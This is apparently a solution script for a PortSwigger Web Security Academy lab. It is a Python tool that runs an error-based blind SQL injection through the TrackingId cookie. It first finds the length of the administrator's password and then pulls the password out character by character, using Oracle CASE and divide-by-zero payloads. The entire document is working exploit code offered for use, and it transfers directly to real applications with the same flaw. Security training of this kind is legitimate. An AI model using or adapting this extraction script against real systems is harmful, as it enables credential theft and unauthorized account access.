import requests
import string

url = 'https://ac111f471e63819bc047118c00c8007b.web-security-academy.net'

# get password length 20
def checkLength():
    for i in range(0, 50):
        # if password length = num then true else false where username = 'administrator'
        payload = '''' union select Case When (length(password) = {}) Then password Else to_char(1/0) End password from users where username = 'administrator' -- -  '''.format(str(i))

        response = requests.get(url, cookies={
            'TrackingId': payload,
            'session': '04vwIeGXYQxrIZEuyuLKtSIQRZ48NpT9'
        })

        print(payload)
        if response.status_code == 200:
            print(i)
            break

# get password 
def getPassword():
    password = ''
    for i in range(1, 21):
        for j in string.printable:
            payload = ''' ' union select Case When (SUBSTR(password,{},1) = '{}') Then password Else to_char(1/0) End password from users where username = 'administrator' -- -  '''.format(str(i), str(j))

            response = requests.get(url, cookies={
                'TrackingId': payload,
                'session': '04vwIeGXYQxrIZEuyuLKtSIQRZ48NpT9'
            })

            print(payload)
            if response.status_code == 200:
                password += j
                print(password)
                break

checkLength()
getPassword()

# while True:
# response = requests.get(url, cookies={
#     'TrackingId': ''' ' union select Case When (SUBSTR(password,1,1) > '0') Then password Else to_char(1/0) End password from users where username = 'administrator' -- -  ''',
#     'session': '04vwIeGXYQxrIZEuyuLKtSIQRZ48NpT9'
# })

# print(response.text)